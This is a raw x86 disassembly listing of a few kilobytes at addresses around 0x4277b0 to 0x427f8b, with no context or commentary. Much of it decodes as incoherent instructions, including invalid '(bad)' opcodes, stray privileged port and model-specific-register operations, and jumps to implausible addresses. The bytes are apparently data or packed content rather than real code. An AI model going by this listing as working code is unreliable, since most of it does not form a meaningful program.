  4277b0:	shr    DWORD PTR [eax],1
  4277b2:	lods   eax,DWORD PTR ds:[esi]
  4277b3:	push   ds
  4277b4:	rol    ebx,0x68
  4277b7:	loope  0x4277d8
  4277b9:	or     BYTE PTR [ebp+0x7a],bl
  4277bc:	cmp    BYTE PTR [ecx-0x16],ah
  4277bf:	jmp    esp
  4277c1:	or     cx,di
  4277c4:	push   ecx
  4277c5:	and    DWORD PTR [esp+esi*8-0x5182149e],esi
  4277cc:	and    BYTE PTR [ecx],0x7d
  4277cf:	and    al,0x9
  4277d1:	lods   al,BYTE PTR ds:[esi]
  4277d2:	ins    BYTE PTR es:[edi],dx
  4277d3:	sbb    DWORD PTR [ebx],edx
  4277d5:	mov    dl,0x22
  4277d7:	in     al,dx
  4277d8:	out    0xc3,eax
  4277da:	cmp    eax,0xc0320dab
  4277df:	dec    ch
  4277e1:	sub    ah,BYTE PTR [eax+ecx*2-0x157913f3]
  4277e8:	jae    0x4277b7
  4277ea:	mov    ds:0xfd5df59e,eax
  4277ef:	push   esi
  4277f0:	hlt    
  4277f1:	mov    cl,0x1a
  4277f3:	fst    QWORD PTR [edi-0x3324d1ae]
  4277f9:	dec    ebp
  4277fa:	inc    ebp
  4277fb:	push   DWORD PTR [esi]
  4277fd:	stos   DWORD PTR es:[edi],eax
  4277fe:	aaa    
  4277ff:	pop    ecx
  427800:	fcom   st(3)
  427802:	pop    ecx
  427803:	ins    BYTE PTR es:[edi],dx
  427804:	test   BYTE PTR [edx+0xd],0xa6
  427808:	repz in al,dx
  42780a:	ficomp WORD PTR [eax]
  42780c:	adc    bl,BYTE PTR [edx-0x3f649d00]
  427812:	ss cmc 
  427814:	imul   bx,WORD PTR gs:[eax+0x35],0xff95
  42781a:	inc    ebp
  42781b:	imul   ecx,esi,0xbadd689c
  427821:	cdq    
  427822:	rcr    BYTE PTR [ecx-0x5],cl
  427825:	mov    edi,0xb223d8d3
  42782a:	push   eax
  42782b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42782c:	fistp  DWORD PTR [ebx+0x72]
  42782f:	shrd   DWORD PTR [ecx+0x2d],esi,cl
  427833:	sub    eax,0x3c2aa46
  427838:	sbb    DWORD PTR [edi+0x3f],0xffffff90
  42783c:	in     eax,dx
  42783d:	jnp    0x427882
  42783f:	and    al,0x7
  427841:	mov    cs,WORD PTR [ebp-0x70]
  427844:	xor    edx,ebp
  427846:	(bad)  
  427847:	ds push ss
  427849:	pop    ds
  42784a:	rcr    DWORD PTR ds:0xa919d132,0x92
  427851:	repnz sar DWORD PTR [ecx+0x46c68f7c],cl
  427858:	jne    0x427817
  42785a:	or     bl,bh
  42785c:	in     eax,0x20
  42785e:	hlt    
  42785f:	pop    ss
  427860:	(bad)  
  427861:	xor    dh,ah
  427863:	jmp    0x4277f4
  427865:	call   0x71f5:0x3fddbcbc
  42786c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42786d:	mov    DWORD PTR [edi],edi
  42786f:	pop    esi
  427870:	jecxz  0x427801
  427872:	or     dl,BYTE PTR [esi+0x7011eeda]
  427878:	imul   ebp,DWORD PTR [ecx],0xffffff9d
  42787b:	push   ds
  42787c:	mov    ds:0xb8eeb011,eax
  427881:	sbb    al,0x6b
  427883:	mov    ds:0x8eb3279b,al
  427888:	sub    edx,0x12
  42788b:	mov    esp,0x136f5703
  427890:	push   edx
  427891:	adc    ebx,ebx
  427893:	xlat   BYTE PTR ds:[ebx]
  427894:	push   ebx
  427895:	dec    eax
  427896:	loopne 0x427895
  427898:	stos   DWORD PTR es:[edi],eax
  427899:	xor    DWORD PTR [ecx],esi
  42789b:	test   ch,0x87
  42789e:	push   cs
  42789f:	(bad)  
  4278a0:	in     al,dx
  4278a1:	in     eax,dx
  4278a2:	push   es
  4278a3:	sti    
  4278a4:	jns    0x4278d9
  4278a6:	xor    ebp,eax
  4278a8:	sbb    BYTE PTR [edi],ch
  4278aa:	and    eax,0x56636bf5
  4278af:	ret    
  4278b0:	dec    ecx
  4278b1:	adc    DWORD PTR ds:0xf10ccc8d,esp
  4278b7:	pop    esp
  4278b8:	jecxz  0x4278c2
  4278ba:	xor    DWORD PTR [eax-0x7689597f],ecx
  4278c0:	mov    esi,0x4e0f661b
  4278c5:	lahf   
  4278c6:	aam    0xe
  4278c8:	pop    ecx
  4278c9:	xchg   edx,eax
  4278ca:	jmp    0x427945
  4278cc:	jmp    0x427924
  4278ce:	ficomp WORD PTR [ebx+0x53]
  4278d1:	mov    eax,DWORD PTR fs:[esi+0x125b8c6]
  4278d8:	xchg   DWORD PTR [esi],eax
  4278da:	mov    fs,WORD PTR [esi+0x13]
  4278dd:	loopne 0x427917
  4278df:	nop
  4278e0:	cmc    
  4278e1:	leave  
  4278e2:	ret    
  4278e3:	cmp    dh,BYTE PTR [edi]
  4278e5:	xchg   edi,eax
  4278e6:	add    cl,BYTE PTR [eax-0x52]
  4278e9:	pop    ecx
  4278ea:	jne    0x4278e5
  4278ec:	ss inc ebp
  4278ee:	or     edi,esi
  4278f0:	rcl    BYTE PTR es:[edx+0x4bcf8541],cl
  4278f7:	and    DWORD PTR [edx],ebx
  4278f9:	or     eax,0x91e3049d
  4278fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278ff:	sahf   
  427900:	call   0x8bb39dc7
  427905:	add    al,0x56
  427907:	lds    esi,FWORD PTR [edx-0x5b]
  42790a:	push   esp
  42790b:	jno    0x42793e
  42790d:	sbb    dl,BYTE PTR [eax-0x76cd55b9]
  427913:	ror    DWORD PTR [ecx],1
  427915:	push   esi
  427916:	mov    bh,0xb8
  427918:	mov    dh,0x69
  42791a:	ins    DWORD PTR es:[edi],dx
  42791b:	pop    esp
  42791c:	mov    dh,0xa8
  42791e:	jge    0x42796f
  427920:	or     BYTE PTR [ebx-0x3d],cl
  427923:	sub    ah,BYTE PTR [edx]
  427925:	mov    eax,0x12d6fd36
  42792a:	sub    ecx,DWORD PTR [ebp+0x48c53d49]
  427930:	inc    ecx
  427931:	pop    ds
  427932:	(bad)  
  427934:	jnp    0x4278e3
  427936:	or     dl,BYTE PTR [ecx]
  427938:	dec    ebx
  427939:	test   esp,ebx
  42793b:	not    BYTE PTR [ecx-0xd]
  42793e:	sub    ebx,DWORD PTR [ebx-0x347053cd]
  427944:	pop    es
  427945:	mov    esi,0xdd4077ce
  42794a:	xchg   DWORD PTR [esi+edx*4-0x45154cbd],ebx
  427951:	pushf  
  427952:	xor    al,0x1f
  427954:	or     dh,BYTE PTR [edx]
  427956:	pop    edi
  427957:	adc    BYTE PTR [ebp+0x1ba8efa0],bh
  42795d:	sub    bh,BYTE PTR [ecx+0x5fb1f179]
  427963:	nop
  427964:	mov    bl,0xd3
  427966:	mov    BYTE PTR [ebx+ebp*1+0x3b],ch
  42796a:	lds    edi,FWORD PTR cs:[ebx]
  42796d:	setno  BYTE PTR [ebx+edi*8+0x31]
  427972:	enter  0x8afb,0x44
  427976:	mov    ?,WORD PTR [ebp-0x33]
  427979:	loop   0x42797b
  42797b:	call   0xa4bd:0x87a13d9b
  427982:	xlat   BYTE PTR ds:[ebx]
  427983:	mov    ecx,0xfef2ade1
  427988:	retf   
  427989:	xchg   edx,eax
  42798a:	into   
  42798b:	lods   al,BYTE PTR ds:[esi]
  42798c:	in     al,0x6f
  42798e:	cdq    
  42798f:	add    eax,DWORD PTR [eax]
	...
  4279a9:	add    BYTE PTR [ebp+0x55],cl
  4279ac:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  4279b2:	mov    esp,ebp
  4279b4:	or     al,ah
  4279b6:	dec    ebp
  4279b7:	add    bh,al
  4279b9:	add    BYTE PTR [eax],cl
  4279bb:	add    BYTE PTR [eax],al
  4279bd:	mov    DWORD PTR [eax],0x3ef44545
  4279c3:	cmp    BYTE PTR [eax],al
  4279c5:	test   DWORD PTR [ebx-0x34070b64],ecx
  4279cb:	(bad)  
  4279cc:	enter  0x4d45,0xb8
  4279d0:	mov    edi,DWORD PTR [ecx]
  4279d2:	hlt    
  4279d3:	test   ebx,ecx
  4279d5:	pushf  
  4279d6:	enter  0x4df8,0x8b
  4279da:	mov    DWORD PTR [ebp+0x8],0x894708
  4279e1:	inc    ebp
  4279e2:	mov    ebp,0xff8bfffc
  4279e7:	dec    ebp
  4279e8:	mov    ch,0xf4
  4279ea:	call   DWORD PTR [ebx-0x1]
  4279ed:	mov    ebx,0x8005022
  4279f2:	call   DWORD PTR [ecx+0x8]
  4279f5:	pop    es
  4279f6:	jmp    0xb8:0x9cb4533
  4279fd:	cwde   
  4279fe:	mov    esi,DWORD PTR [edx-0xc]
  427a01:	xor    al,bl
  427a03:	add    BYTE PTR [eax+0x3c83203],bl
  427a09:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  427a0f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  427a15:	xor    eax,DWORD PTR [eax]
  427a17:	retf   
  427a18:	ret    
  427a19:	add    eax,esi
  427a1b:	enter  0x8945,0x64
  427a1f:	dec    ebp
  427a20:	sbb    ah,cl
  427a22:	add    BYTE PTR [ebx-0xb87b277],cl
  427a28:	dec    DWORD PTR [ebx-0xbcfb275]
  427a2e:	test   DWORD PTR [ebx],esi
  427a30:	dec    ebx
  427a32:	inc    DWORD PTR [ebx]
  427a34:	inc    eax
  427a35:	enter  0x8989,0x64
  427a39:	(bad)  
  427a3a:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  427a3e:	cld    
  427a3f:	dec    DWORD PTR [ebp-0xa90001]
  427a45:	push   edi
  427a46:	mov    BYTE PTR [edx+0x1],ch
  427a49:	and    BYTE PTR [eax],al
  427a4b:	pop    ecx
  427a4c:	inc    ebp
  427a4d:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  427a53:	push   0xffffff89
  427a55:	pop    ecx
  427a56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a57:	dec    ebp
  427a58:	add    BYTE PTR [ecx+0x45fc088b],cl
  427a5e:	jne    0x427aa8
  427a60:	lea    eax,[eax]
  427a62:	fs (bad) 
  427a64:	dec    DWORD PTR [eax]
  427a66:	mov    DWORD PTR [eax],eax
  427a68:	test   al,0x0
  427a6a:	add    BYTE PTR [ebp-0x18],cl
  427a6d:	xor    ebp,DWORD PTR [edx]
  427a6f:	add    eax,DWORD PTR [eax]
  427a71:	mov    eax,eax
  427a73:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  427a7a:	inc    ebp
  427a7b:	mov    DWORD PTR [ebx+0x459408],ecx
  427a81:	popa   
  427a82:	mov    esp,DWORD PTR [ebp-0x75]
  427a85:	(bad)  
  427a86:	cld    
  427a87:	inc    eax
  427a88:	cmp    bh,0x1
  427a8b:	lea    eax,[eax]
  427a8d:	and    BYTE PTR [eax],al
  427a8f:	inc    DWORD PTR [ecx-0x18]
  427a92:	mov    ecx,DWORD PTR [ebx]
  427a94:	cld    
  427a95:	add    BYTE PTR [ecx+0x75014d],cl
  427a9b:	(bad)  
  427a9c:	xchg   ebp,eax
  427a9d:	sar    bh,1
  427a9f:	inc    eax
  427aa0:	inc    DWORD PTR [eax]
  427aa2:	mov    eax,DWORD PTR [ebp-0x4]
  427aa5:	xor    edx,DWORD PTR [edx+0x7201be]
  427aab:	add    BYTE PTR [edx],dl
  427aad:	(bad)  
  427aae:	nop
  427aaf:	inc    ebp
  427ab0:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427ab6:	mov    al,0xff
  427ab8:	add    bh,bh
  427aba:	add    BYTE PTR [ebx],dh
  427abc:	inc    DWORD PTR [ebx]
  427abe:	sbb    al,0x89
  427ac0:	jne    0x427a9e
  427ac2:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427ac8:	mov    eax,DWORD PTR [ebp-0xff0048]
  427ace:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427ad5:	inc    DWORD PTR [ebp-0x75]
  427ad8:	fisttp QWORD PTR [eax+ebp*8]
  427adb:	test   DWORD PTR [esi-0x1],esp
  427ade:	inc    ebp
  427adf:	(bad)  
  427ae0:	aas    
  427ae1:	inc    ebp
  427ae2:	(bad)  
  427ae3:	lea    edi,[eax+edi*2-0x1]
  427ae7:	inc    edi
  427ae9:	mov    DWORD PTR ds:0x8000c7a0,edi
  427aef:	mov    ebp,esi
  427af1:	cld    
  427af2:	in     al,0x8d
  427af4:	inc    ebp
  427af5:	(bad)  
  427af6:	call   0xc7cb5afa
  427afb:	add    DWORD PTR [eax-0x11ba1500],ecx
  427b01:	inc    DWORD PTR [ebp-0x4]
  427b04:	out    0x8d,eax
  427b06:	aas    
  427b07:	(bad)  
  427b08:	call   0xcaa60c
  427b0d:	add    DWORD PTR [ebx-0x7f570400],ecx
  427b13:	add    BYTE PTR [ecx],al
  427b15:	test   DWORD PTR [eax],eax
  427b17:	wrmsr  
  427b19:	jae    0x427b08
  427b1b:	add    BYTE PTR [eax],al
  427b1d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  427b23:	add    esp,edi
  427b25:	add    BYTE PTR [eax+0x450108],al
  427b2b:	mov    edi,DWORD PTR [ebp-0x6c]
  427b2e:	add    DWORD PTR [eax],0x4
  427b31:	mov    eax,DWORD PTR [ebp+0x3]
  427b34:	mov    edi,DWORD PTR [esp+edi*8]
  427b37:	dec    ebp
  427b38:	nop
  427b39:	mov    eax,DWORD PTR [ecx]
  427b3b:	fadd   DWORD PTR [eax]
  427b3d:	add    BYTE PTR [esi],al
  427b3f:	lea    eax,[eax]
  427b41:	pusha  
  427b42:	push   eax
  427b43:	inc    DWORD PTR [ebp+0x52]
  427b46:	call   DWORD PTR [ebp-0x7b]
  427b49:	mov    esi,DWORD PTR [ebp-0x74]
  427b4c:	mov    eax,DWORD PTR [eax]
  427b4e:	cld    
  427b4f:	mov    eax,DWORD PTR [eax+0x880103]
  427b55:	add    BYTE PTR [ebp+0x6a],bh
  427b58:	cmp    edi,0x10
  427b5b:	mov    WORD PTR [ebp+0x0],es
  427b5e:	mov    edx,DWORD PTR [edx-0x4]
  427b61:	push   ecx
  427b62:	nop
  427b63:	inc    DWORD PTR [ecx]
  427b65:	cld    
  427b66:	add    BYTE PTR [ebp-0x24],bh
  427b69:	mov    eax,DWORD PTR [eax]
  427b6b:	cld    
  427b6c:	push   eax
  427b6d:	nop
  427b6e:	inc    ebp
  427b6f:	add    edi,edi
  427b71:	add    BYTE PTR [ebx+0x4de4f445],cl
  427b77:	in     al,dx
  427b78:	xor    eax,edi
  427b7a:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427b81:	mov    DWORD PTR [eax],0xb8788b98
  427b87:	test   ebx,eax
  427b89:	jmp    FWORD PTR [eax-0x1]
  427b8c:	int    0xed
  427b8e:	sub    esp,eax
  427b90:	add    eax,DWORD PTR [ebp-0x30]
  427b93:	fild   WORD PTR [ebp+0x3f]
  427b96:	cmp    eax,edi
  427b98:	je     0xca435bba
  427b9e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427ba5:	(bad)  
  427ba6:	jne    0x427b34
  427ba8:	mov    ebx,ebp
  427baa:	cld    
  427bab:	js     0x427bf2
  427bad:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427bb3:	inc    ebp
  427bb4:	call   0xeaa544
  427bb9:	add    BYTE PTR [ebx-0x7f170301],cl
  427bbf:	add    DWORD PTR es:[eax],eax
  427bc2:	add    al,al
  427bc4:	xor    BYTE PTR [eax+0x41],dl
  427bc7:	inc    ebp
  427bc8:	add    BYTE PTR [ebx+0xfcd88b],cl
  427bce:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427bd4:	add    DWORD PTR [ecx+0x458be845],ecx
  427bda:	fmul   DWORD PTR [ebx+0x8bb800]
  427be0:	cld    
  427be1:	call   0xd7a6a6
  427be6:	dec    DWORD PTR [ebx+0x1090e8ff]
  427bec:	add    al,al
  427bee:	push   eax
  427bef:	es inc ebp
  427bf1:	inc    ebp
  427bf2:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427bf8:	dec    DWORD PTR [ebx-0x3ff70301]
  427bfe:	mov    DWORD PTR gs:[eax],eax
  427c01:	call   0x8b6ac1c6
  427c06:	inc    ebp
  427c07:	mov    eax,0xe8d8008b
  427c0c:	add    BYTE PTR [ecx],ch
  427c0e:	mov    eax,DWORD PTR [eax]
  427c10:	cld    
  427c11:	mov    eax,eax
  427c13:	call   0x462a8c6d
  427c18:	sub    DWORD PTR [ebx-0x3c743000],ecx
  427c1e:	cld    
  427c1f:	mov    BYTE PTR [eax+0x8401c1],0x1
  427c26:	xor    BYTE PTR [eax],al
  427c28:	push   edi
  427c29:	inc    ebp
  427c2a:	mov    DWORD PTR [ebx],esi
  427c2c:	in     al,0xb9
  427c2e:	inc    ebp
  427c2f:	lea    ecx,[ebx-0x3c370301]
  427c35:	dec    ebp
  427c36:	cwde   
  427c37:	mov    esi,DWORD PTR [edx]
  427c39:	or     BYTE PTR [ebx],al
  427c3b:	ror    DWORD PTR [ebp-0xfebf79],0x0
  427c42:	call   0x42a58c
  427c47:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  427c4d:	jge    0x427c82
  427c4f:	mov    eax,DWORD PTR [ebx]
  427c51:	cld    
  427c52:	lea    edx,[eax+0xff0120]
  427c58:	call   0x42a5ec
  427c5d:	push   eax
  427c5e:	inc    DWORD PTR [ebp-0x1c]
  427c61:	mov    ecx,DWORD PTR [ebp-0x58]
  427c64:	xor    eax,DWORD PTR [eax]
  427c66:	add    edi,edi
  427c68:	cmp    ebp,eax
  427c6a:	jne    0x427c92
  427c6c:	mov    DWORD PTR [eax],0x8b004dd8
  427c72:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  427c79:	mov    eax,ebx
  427c7b:	cld    
  427c7c:	test   BYTE PTR [eax+0x320198],bh
  427c82:	mov    DWORD PTR [ebp+0x8],esi
  427c85:	xor    eax,DWORD PTR [ebp-0x73]
  427c88:	test   DWORD PTR [esp+esi*2-0x1],edi
  427c8c:	mov    ebp,eax
  427c8e:	mov    eax,0x33004d29
  427c93:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427c99:	add    DWORD PTR [eax],eax
  427c9b:	add    BYTE PTR [ebp+0x30],al
  427c9e:	mov    edx,DWORD PTR [edi-0x48]
  427ca1:	add    ebx,0xffffffe4
  427ca4:	push   0x2b74cd85
  427ca9:	mov    eax,DWORD PTR [ebx]
  427cab:	cld    
  427cac:	sar    BYTE PTR [eax+0x3b0145],1
  427cb2:	pcmpeqw mm4,mm6
  427cb5:	xor    edi,edi
  427cb7:	lea    ecx,[ebx-0x239c7470]
  427cbd:	add    BYTE PTR [ebp+0x50],cl
  427cc0:	cmp    eax,DWORD PTR [ebp+0x75]
  427cc3:	mov    ebp,DWORD PTR [eax-0x68]
  427cc6:	test   DWORD PTR [eax],eax
  427cc8:	clc    
  427cc9:	push   DWORD PTR [ebp-0x1]
  427ccc:	lea    ecx,[eax]
  427cce:	int3   
  427ccf:	inc    ebp
  427cd0:	call   0xfaad60
  427cd5:	jne    0x427ccf
  427cd7:	xor    edi,DWORD PTR [ebp-0x41]
  427cda:	jmp    0x427d4e
  427cdc:	mov    eax,DWORD PTR [eax]
  427cde:	mov    eax,0x339545c7
  427ce3:	inc    DWORD PTR [ebx]
  427ce5:	push   DWORD PTR [ecx]
  427ce7:	aaa    
  427ce8:	mov    eax,DWORD PTR [eax]
  427cea:	jmp    0x427d3c
  427cec:	mov    eax,DWORD PTR [ebp-0x3c]
  427cef:	mov    eax,eax
  427cf1:	cld    
  427cf2:	clc    
  427cf3:	ret    
  427cf4:	test   bh,al
  427cf6:	pop    es
  427cf7:	xchg   ebp,eax
  427cf8:	add    bh,bh
  427cfa:	inc    ebp
  427cfb:	dec    DWORD PTR [edi]
  427cfd:	and    DWORD PTR [ebx],ebp
  427cff:	add    BYTE PTR [eax],al
  427d01:	push   eax
  427d02:	jbe    0x427d59
  427d04:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  427d0a:	or     al,0xcf
  427d0c:	inc    eax
  427d0d:	enter  0x745,0x72
  427d11:	inc    ebp
  427d12:	mov    eax,DWORD PTR [ecx]
  427d14:	int3   
  427d15:	add    BYTE PTR [ebp-0x75],al
  427d18:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  427d1e:	ror    BYTE PTR [ebp+0x72f80885],1
  427d24:	inc    ebp
  427d25:	add    BYTE PTR [ebx-0x3c7423bb],cl
  427d2b:	fadd   st,st(6)
  427d2d:	rol    BYTE PTR [ebp+0x12],0x8b
  427d31:	inc    ebp
  427d32:	fmul   QWORD PTR [ebx-0x3c39233d]
  427d38:	inc    ebp
  427d39:	test   bh,al
  427d3b:	cwde   
  427d3c:	clc    
  427d3d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  427d43:	inc    ebp
  427d44:	cmp    dh,BYTE PTR [ebx]
  427d46:	pushf  
  427d47:	mov    ecx,0xffb48dc7
  427d4c:	test   eax,ecx
  427d4e:	clc    
  427d4f:	dec    ebp
  427d50:	inc    ebp
  427d51:	mov    edi,DWORD PTR [eax+ecx*1]
  427d54:	pushf  
  427d55:	rol    edi,0x86
  427d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d59:	inc    BYTE PTR [ebp+0x45f7f8ff]
  427d5f:	inc    ebp
  427d60:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  427d68:	test   DWORD PTR [eax],edi
  427d6a:	clc    
  427d6b:	pushf  
  427d6c:	inc    ebp
  427d6d:	dec    DWORD PTR [ebx-0x3cba0f04]
  427d73:	push   eax
  427d74:	(bad)  
  427d75:	cld    
  427d76:	jge    0x427d78
  427d78:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  427d7e:	add    BYTE PTR [ebx],dl
  427d80:	jmp    0xcd7ed2
  427d85:	les    eax,FWORD PTR [ebp-0x35]
  427d88:	mov    ecx,esi
  427d8a:	lock or al,cl
  427d8d:	clc    
  427d8e:	inc    ebp
  427d8f:	add    esi,DWORD PTR [ebx]
  427d91:	jge    0x427d96
  427d93:	xor    edi,DWORD PTR [ebx]
  427d95:	cmp    ecx,DWORD PTR [edi]
  427d97:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  427d9c:	mov    edi,DWORD PTR [ecx]
  427d9e:	test   al,0xcc
  427da0:	dec    ebp
  427da1:	test   BYTE PTR [ebx],dh
  427da3:	pop    es
  427da4:	xor    eax,DWORD PTR [eax]
  427da6:	add    ecx,DWORD PTR [esi]
  427da8:	add    ecx,eax
  427daa:	psraw  mm0,mm1
  427dad:	sub    BYTE PTR [ebp+0x38],cl
  427db0:	mov    edi,DWORD PTR [ebx]
  427db2:	lock int3 
  427db4:	shl    edx,1
  427db6:	rol    BYTE PTR [ebp+0xc],1
  427db9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427dc0:	jmp    0x7b7e0a
  427dc5:	pushf  
  427dc6:	inc    ebp
  427dc7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  427dcd:	xor    ecx,ebx
  427dcf:	add    ecx,esi
  427dd1:	mov    esi,eax
  427dd3:	enter  0x45af,0x8b
  427dd7:	xor    ecx,eax
  427dd9:	add    edx,DWORD PTR [ebp-0x77]
  427ddc:	sub    ecx,DWORD PTR [eax]
  427dde:	cmp    eax,DWORD PTR [ebp+0x77]
  427de1:	fmul   DWORD PTR [ebx-0x76385764]
  427de7:	test   al,0x0
  427de9:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  427def:	cmp    esi,DWORD PTR [ebx]
  427df1:	pushf  
  427df2:	xor    eax,edi
  427df4:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  427dfb:	inc    ebp
  427dfc:	dec    ebp
  427dfd:	cmp    eax,0xc7f09c8b
  427e02:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427e09:	inc    ebp
  427e0a:	jmp    0x427e4b
  427e0c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427e13:	dec    ebp
  427e14:	xor    esi,DWORD PTR [ebx]
  427e16:	add    eax,DWORD PTR [ebx]
  427e18:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  427e1e:	dec    ebp
  427e1f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  427e25:	out    dx,eax
  427e26:	rol    BYTE PTR [eax],1
  427e28:	add    eax,0xebc8458b
  427e2d:	dec    ebp
  427e2e:	mov    ebp,DWORD PTR [ebx]
  427e30:	mov    esp,0x33f84d8b
  427e35:	ret    
  427e36:	xor    eax,esi
  427e38:	add    ecx,eax
  427e3a:	add    eax,DWORD PTR [edx+0xc1010f]
  427e40:	dec    ebp
  427e41:	inc    ebp
  427e42:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  427e48:	ror    bl,1
  427e4a:	add    eax,0xebc645ce
  427e4f:	scas   eax,DWORD PTR es:[edi]
  427e50:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  427e56:	xor    ebp,DWORD PTR [ebx]
  427e58:	xor    edi,DWORD PTR [ebx]
  427e5a:	add    esi,DWORD PTR [edi+0x3]
  427e5d:	mov    ecx,DWORD PTR [edi]
  427e5f:	clc    
  427e60:	rol    ebx,0x4d
  427e63:	(bad)  
  427e64:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  427e6b:	mov    ah,0x45
  427e6d:	dec    ebp
  427e6e:	jbe    0x427ea3
  427e70:	mov    esi,DWORD PTR [ebx]
  427e72:	call   0x3345cb7a
  427e77:	rdpmc  
  427e79:	rol    DWORD PTR [ebx],0x4d
  427e7c:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427e82:	inc    ebp
  427e83:	ror    BYTE PTR [ebx+0x45450808],1
  427e89:	jmp    0x10a7f19
  427e8e:	inc    ebp
  427e8f:	inc    ebp
  427e90:	(bad)  
  427e91:	mov    ebx,eax
  427e93:	clc    
  427e94:	test   ebx,eax
  427e96:	clc    
  427e97:	retf   
  427e98:	inc    ebp
  427e99:	into   
  427e9a:	mov    esi,0x8b85afec
  427ea0:	clc    
  427ea1:	enter  0x5545,0x3a
  427ea5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  427eac:	ret    
  427ead:	mov    ah,0xc6
  427eaf:	addr16 push 0x338b4545
  427eb5:	clc    
  427eb6:	add    eax,ebx
  427eb8:	loopne 0x427e85
  427eba:	dec    ebp
  427ebb:	into   
  427ebc:	mov    al,dh
  427ebe:	or     BYTE PTR [edi-0x37ff748e],ch
  427ec4:	inc    ebp
  427ec5:	push   ebp
  427ec6:	mov    ebp,DWORD PTR [ebx]
  427ec8:	in     al,dx
  427ec9:	cmp    eax,ebx
  427ecb:	ja     0x427f12
  427ecd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427ed3:	inc    ebp
  427ed4:	cwde   
  427ed5:	mov    esi,DWORD PTR [edx]
  427ed7:	clc    
  427ed8:	mov    bl,al
  427eda:	xlat   BYTE PTR ds:[ebx]
  427edb:	retf   
  427edc:	inc    ebp
  427edd:	into   
  427ede:	mov    eax,esi
  427ee0:	in     al,dx
  427ee1:	scas   eax,DWORD PTR es:[edi]
  427ee2:	retf   
  427ee3:	mov    ecx,DWORD PTR [ebp-0x38]
  427ee6:	mov    edx,DWORD PTR [ebp-0x24]
  427ee9:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427ef0:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427ef7:	mov    eax,DWORD PTR [ebx]
  427ef9:	clc    
  427efa:	loopne 0x427ebf
  427efc:	push   ebp
  427efd:	retf   
  427efe:	mov    dh,al
  427f00:	adc    esi,ecx
  427f02:	jb     0x427eb3
  427f04:	add    BYTE PTR [ebx+0x558bc845],cl
  427f0a:	in     al,dx
  427f0b:	sub    eax,ebx
  427f0d:	cmp    ecx,ebx
  427f0f:	mov    eax,esi
  427f11:	mov    esp,0x45af03ce
  427f16:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  427f1c:	mov    eax,ebx
  427f1e:	in     al,dx
  427f1f:	into   
  427f20:	dec    ebp
  427f21:	(bad)  
  427f22:	xor    ebp,DWORD PTR [edi+0x80f8903]
  427f28:	rol    DWORD PTR [ebp+0x4d],0x89
  427f2c:	xor    esp,esp
  427f2e:	sub    eax,DWORD PTR [ebp-0x75]
  427f31:	add    ebp,esp
  427f33:	mov    al,0x55
  427f35:	inc    ebp
  427f36:	xor    edi,DWORD PTR [eax]
  427f38:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  427f3f:	inc    ebp
  427f40:	xor    edi,DWORD PTR [ecx]
  427f42:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  427f49:	test   DWORD PTR [eax],eax
  427f4b:	clc    
  427f4c:	enter  0x8645,0x33
  427f50:	inc    DWORD PTR [ebx]
  427f52:	(bad)  
  427f53:	jmp    0x427f9a
  427f55:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  427f5b:	inc    ebp
  427f5c:	(bad)  
  427f5d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  427f63:	cwde   
  427f64:	retf   
  427f65:	xor    al,cl
  427f67:	mov    BYTE PTR [ebp+0xb],cl
  427f6a:	lea    eax,[ebp+0x8]
  427f6d:	xor    esi,DWORD PTR [edx+0x3]
  427f70:	add    al,ah
  427f72:	inc    ebp
  427f73:	dec    ebp
  427f74:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  427f7a:	push   0x2b45cd00
  427f7f:	mov    al,BYTE PTR [ebx]
  427f81:	or     esi,eax
  427f83:	dec    ebp
  427f84:	inc    ebp
  427f85:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  427f8b:	push   ebp
